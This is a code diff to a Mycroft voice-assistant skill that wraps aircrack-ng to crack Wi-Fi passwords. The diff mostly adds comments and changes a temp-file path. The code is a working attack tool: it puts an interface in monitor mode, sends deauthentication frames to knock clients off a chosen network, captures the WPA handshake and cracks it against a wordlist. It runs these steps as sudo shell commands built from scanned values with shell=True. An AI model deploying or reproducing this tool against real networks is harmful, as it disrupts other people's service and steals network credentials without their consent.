@@ -1,19 +1,27 @@
 from adapt.intent import IntentBuilder
 from mycroft.skills.core import MycroftSkill, intent_handler
 from mycroft.util.log import LOG
-import subprocess, re, uuid, pexpect
-
+import subprocess, re, uuid, pexpect, tempfile
+# https://github.com/JonStratton/skill-aircrack
+# Just enough of a wrapper around some system commands to allow aircrack to crack wifi passwords. Basically
+# 1. Choose an interface
+# 2. Select a network
+# 3. Monitor the network
+# 4. Deauth the clients connected to the network (unless you can wait)
+# 5. Crack password with wordlist
 
 class AircrackSkill(MycroftSkill):
 
+    # Deauths all connected clients to an interface. Some may reconnect so we can capture the auth.
     def deauth_clients( self, address, interface ):
         cmd = 'sudo aireplay-ng -0 1 -a %s %s' % ( address, interface )
         LOG.info( 'Executing: %s' % ( cmd ) )
         code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )
         return code
 
+    # Start dumping the network traffic
     def start_dump( self, interface, network):
-        file_base = '/tmp/airodump_%s' % ( uuid.uuid4() ) 
+        file_base = '%s/airodump_%s' % ( tempfile.gettempdir(), uuid.uuid4() )
         file_pcap = ''
         try:
            cmd = 'sudo airodump-ng %s --bssid %s --channel %s --output-format pcap --write %s -u 2' % ( interface, network.get( 'Address', '' ), network.get('Channel', ''), file_base )
@@ -22,10 +30,11 @@ class AircrackSkill(MycroftSkill):
            p.expect( 'handshake' )
            p.sendcontrol('c');
            file_pcap = '%s-01.cap' % ( file_base )
-        except:
+        except: # Probably a timeout
            pass
         return file_pcap
 
+    # Takes runs locate on a file to get the full path
     def get_wordlist_path( self, wordlist_file ):
         wordlist_path = ''
         cmd = 'locate %s' % wordlist_file
@@ -35,6 +44,7 @@ class AircrackSkill(MycroftSkill):
            wordlist_path = line.decode('utf-8').rstrip()
         return wordlist_path
 
+    # After an auth has been captured, try to crack it with the worklist.
     def start_crack( self, cap_file, wordlist):
         password = ''
         cmd = 'aircrack-ng %s -w %s' % ( cap_file, wordlist )
@@ -48,6 +58,7 @@ class AircrackSkill(MycroftSkill):
            pass
         return password
 
+    # Bring up the interface in monitor mode.
     def start_interface( self, interface ):
         new_device = ''
         cmd = 'sudo airmon-ng start %s' % ( interface )
@@ -61,12 +72,14 @@ class AircrackSkill(MycroftSkill):
            pass
         return new_device
 
+    # Stop monitoring interface
     def stop_interface( self, interface ):
         cmd = 'sudo airmon-ng stop %s' % ( interface )
         LOG.info( 'Executing: %s' % ( cmd ) )
         code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )
         return code
 
+    # List the connected network interfaces.
     def get_available_interfaces( self ):
         if_list = []
         cmd = 'sudo airmon-ng'
@@ -82,6 +95,7 @@ class AircrackSkill(MycroftSkill):
         retval = p.wait
         return if_list
 
+    # The conditional logic for below
     def check_network( self, network, match_regex ):
         is_match = False
         if network and network.get( 'ESSID', '' ):
@@ -91,6 +105,7 @@ class AircrackSkill(MycroftSkill):
               is_match = False
         return is_match
 
+    # Scan the interface for networks.
     def get_available_networks( self, interface, name_search ):
         net_list = []
         network  = {}
@@ -114,12 +129,14 @@ class AircrackSkill(MycroftSkill):
            net_list.append( network )
         return net_list
 
+    # Takes are complicated network list, and returns a simple array of names.
     def get_essid_list( self, network_list ):
         essid_list = []
         for network in network_list:
             essid_list.append( network.get( 'ESSID', '' ) )
         return essid_list
 
+    # Takes an array of strings, and returns a single string with numbers. So we can tts it.
     def list_to_string( self, list_to_string ):
         counted_list = []
         counter      = 0
